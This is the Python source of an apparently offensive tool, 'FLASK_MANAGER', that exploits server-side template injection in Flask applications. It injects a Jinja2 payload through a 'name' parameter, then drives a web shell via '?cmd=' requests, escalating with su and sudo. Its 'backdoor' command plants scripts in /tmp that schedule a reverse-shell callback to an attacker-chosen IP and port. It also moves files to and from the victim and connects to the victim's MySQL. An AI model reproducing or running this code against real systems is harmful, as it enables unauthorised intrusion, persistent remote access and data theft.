from importlib import reload
import sys
import requests
import argparse
import banner
from cmd import Cmd
import poc
import re
import isset
import simplify
import su
import base64
import backdoor
import mysql_connect
import file_download
import file_upload

#交互式shell，Client类
class Client(Cmd):
    prompt = 'FLASK_MANAGER>'
    dir=''
    user=''
    #flag表示是否执行过cd命令
    flag=0
    #su_flag表示是否成功执行过su root
    su_flag=0

    def __init(self):
        reload(sys)
        sys.setdefaultencoding('utf-8')
        
        Cmd.__init__(self)

    def preloop(self):
        res1 = requests.get(url=url+'?cmd=pwd', headers=headers)
        directory=res1.text

        res2=requests.get(url=url+'?cmd=uname -a', headers=headers)
        info=res2.text

        res3=requests.get(url=url+'?cmd=whoami', headers=headers)
        user=res3.text

        tmp1=banner.colors.blue + "[+]基础信息:" + "\n" + "[+]当前路径:" + banner.colors.white + directory
        tmp2=banner.colors.blue + "[+]系统信息:" + banner.colors.white + info 
        tmp3=banner.colors.blue + "[+]当前用户:" + banner.colors.white + user 

        print(tmp1+tmp2+tmp3)

        user = requests.get(url=url+'?cmd=whoami', headers=headers)
        whoami=user.text.replace('\n', '').replace('\r', '')
            
            
        directory = requests.get(url=url+'?cmd=pwd', headers=headers)
        pwd=directory.text.replace('\n', '').replace('\r', '')
          
        Client.dir=pwd
        Client.user=whoami
        Client.prompt=banner.colors.white + "@" + whoami + "~" + pwd + ">"

    def onecmd(self,arg):
        
        if(re.match("^cd ", arg)):    
            if Client.flag==0:    
                directory = requests.get(url=url+'?cmd=pwd', headers=headers)
                dir=directory.text.replace('\n', '').replace('\r', '')
                Client.dir=dir

                user = requests.get(url=url+'?cmd=whoami', headers=headers)
                whoami=user.text.replace('\n', '').replace('\r', '')
               
                if Client.su_flag==1:
                    Client.user='root'
                    Client.prompt="@" + Client.user + banner.colors.white + "~" + Client.dir + ">"
                else:   
                    Client.user=whoami
                    Client.prompt=banner.colors.white + "@" + Client.user + "~" + Client.dir + ">"
            
            else:
                a=1

            str=arg[3:]
            #创建isset类对象
            newis=isset.Isset(str,Client.dir) #参数为要cd的目录和当前目录

            res = requests.get(base_url +"/?name=" +newis.payload, headers=headers)
               
            if 'True' in res.text:
                if newis.flag==0:
                    if Client.dir=='/':
                        Client.dir=Client.dir+str
                         #简化shell提示符
                        clz=simplify.Simplify(Client.dir)
                        Client.dir=clz.filter()


                        Client.prompt=banner.colors.white + "@" + Client.user + "~" + Client.dir + ">"
                        res = requests.get(url=url+'?cmd=cd '+Client.dir+';' + arg, headers=headers)
                        print(res.text)
                        Client.flag=1
                    else:
                        Client.dir=Client.dir+'/'+str
                        
                        #简化shell提示符
                        clz=simplify.Simplify(Client.dir)
                        Client.dir=clz.filter()


                        Client.prompt=banner.colors.white + "@" + Client.user + "~" + Client.dir + ">"
                        res = requests.get(url=url+'?cmd=cd '+Client.dir+';' + arg, headers=headers)
                        print(res.text)
                        Client.flag=1
                        
                else:
                    Client.dir=str

                    #简化shell提示符
                    clz=simplify.Simplify(Client.dir)
                    Client.dir=clz.filter()
                    
                    Client.prompt=banner.colors.white + "@" + Client.user + "~" + Client.dir + ">"
                    res = requests.get(url=url+'?cmd=cd '+Client.dir+';' + arg, headers=headers)
                    print(res.text)
                    Client.flag=1

            else:
                print("No such file or directory")

        elif arg=='exit':
            print('Farewell')
            return True
            
        elif arg=='backdoor':
          #  try:
                ctx=input("please input ip and port(split with space):")
                ip_port=ctx.split(' ')                
                ip=ip_port[0]
                port=ip_port[1]

                clz=backdoor.Backdoor(ip,port)

                ctx1=clz.get_payload1()
        
                ctx2=clz.get_payload2()

            
                res1=requests.get(url=url+'?cmd=cd /tmp;echo \''+ctx1+'\' > task.sh', headers=headers)
                
                
                res2=requests.get(url=url+'?cmd=cd /tmp;echo \''+ctx2+'\' > create_task.sh', headers=headers)

                res3=requests.get(url=url+'?cmd=cd /tmp;chmod 777 task.sh', headers=headers)
                
                res4=requests.get(url=url+'?cmd=cd /tmp;chmod 777 create_task.sh', headers=headers)
                
                res5=requests.get(url=url+'?cmd=cd tmp;./create_task.sh', headers=headers)
                

                print("\n"+"The planned task has taken effect, please enable listening")
         #   except:
          #      print("write failed!")

        elif arg=='mysql':
            ip=url[7:].split(':')[0]
            clz=mysql_connect.mysql_scan(ip,'3306')
            if clz.scan()==1:
                user=input("Please input database user:")
                password=input("Please input password of the user your chosen:")
                database=input("Please input the name of databse you want use:")
                clzz=mysql_connect.mysql_connect(ip,user,password,database)
                if clzz.connect()==1:
                    clzz.exe()
                else:
                    print("Connect error!")
                    
            else:
                print("Mysql seems not running")

        elif re.match("su", arg):
            if Client.su_flag==1:
                print("You are already root!" + "\n")
            else:
                passwd=input("Input password for 'root':")
                clz=su.su(passwd)
                res = requests.get(url=url+'?cmd='+clz.get_payload(), headers=headers)
                if 'root' in res.text:
                    Client.user='root'
                    Client.su_flag=1
                    Client.prompt= "@" + Client.user + banner.colors.white + "~" + Client.dir + ">"
                    
                else:
                    print("Password wrong!"+"\n")

        elif arg=='download':
            filename=input("Please input filename: ")
            res = requests.get(base_url +"/?name={{url_for.__globals__.get('os').path.exists('" + Client.dir+'/'+filename + "')}}", headers=headers)
               
            if 'True' in res.text:

                clz=file_download.Download(filename,Client.dir,Client.user,url)
                clz.exe()
                download_dir='./DOWNLOAD/'+filename
                # 创建文件并写入内容
                try:
                    with open(download_dir, mode="w", encoding="utf-8") as f:
                        f.write(file_download.Download.ctx)
                except:
                    print("Download failed!")
            else:
                print("File dosen't exist!")
                
        elif arg=='upload':
            filename=input("Please input filename: ")
            tmpname=filename+'_'
            clz=file_upload.Upload(filename)
            if clz.check():
                clz.exe()
                
                #把base64编码后的内容写入临时文件
                ctx1=requests.get(url=url+'?cmd=cd '+Client.dir+';echo \''+file_upload.Upload.poc+'\' > '+tmpname, headers=headers)
                
                #把base64解码后的内容写入同名文件
                ctx2=requests.get(url=url+'?cmd=cd '+Client.dir+';base64 -d '+tmpname+' > '+filename, headers=headers)
                
                #删除临时文件
                ctx3=requests.get(url=url+'?cmd=cd '+Client.dir+';rm -rf '+tmpname, headers=headers)

            else:
                print("File dosen't exist!")



        else:
            if Client.flag==0:
                directory = requests.get(url=url+'?cmd=pwd', headers=headers)
                dir=directory.text.replace('\n', '').replace('\r', '')
                
                user = requests.get(url=url+'?cmd=whoami', headers=headers)
                whoami=user.text.replace('\n', '').replace('\r', '')
                Client.dir=dir
                Client.user=whoami

                if Client.su_flag==1:
                    Client.user='root'
                    Client.prompt="@" + Client.user + banner.colors.white + "~" + Client.dir + ">"
                    res = requests.get(url=url+'?cmd= cd '+Client.dir+';' + 'sudo -S ' + arg, headers=headers)
                   

                    print(res.text)
                else:   
                    res = requests.get(url=url+'?cmd=cd '+Client.dir+';' + arg, headers=headers)
                    print(res.text)
              
            else:
                if Client.su_flag==1:
                    Client.user='root'
                    Client.prompt= "@" + Client.user + banner.colors.white + "~" + Client.dir + ">"
                    
                    res = requests.get(url=url+'?cmd= cd '+Client.dir+';' + 'sudo -S ' + arg, headers=headers)

                    print(res.text)
                else:   
                    res = requests.get(url=url+'?cmd=cd '+Client.dir+';' + arg, headers=headers)

                    print(res.text)
            



if __name__ == "__main__":
    
    #输出banner
    print(banner.banner)

    #运行脚本命令参数提示   
    parser = argparse.ArgumentParser()
    parser.add_argument("--url",help="http://www.xxx.com:5000")
    
    parser.add_argument("--poc",help=poc.poc)
    
    args = parser.parse_args()

    if(not args.url):
        exit(parser.print_help())
    

    url = args.url + "/shell"
    base_url=args.url
    

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'
    }

    #测试是否可连接
    try:
        test = requests.get(base_url)

        if test.status_code==200:
            print(banner.colors.green + "[+] Target connected!" + '\n')

            ans=input("Do you want inject exp now?(y/n)")

            if ans=='y':
                res=requests.get(url=base_url+'/?name={{'+poc.poc+'}}', headers=headers)
                print("\n"+'Attack successed!')
            else:
                print("See you next time")
                sys.exit("See you next time")   

        else:
            sys.exit("Connect error, please check your network status")
    except:
        sys.exit("Connect error, please check your url form or network status")

#第一个Cmd实例
    try:
        client1 = Client()
        client1.cmdloop()
    except:
        exit()

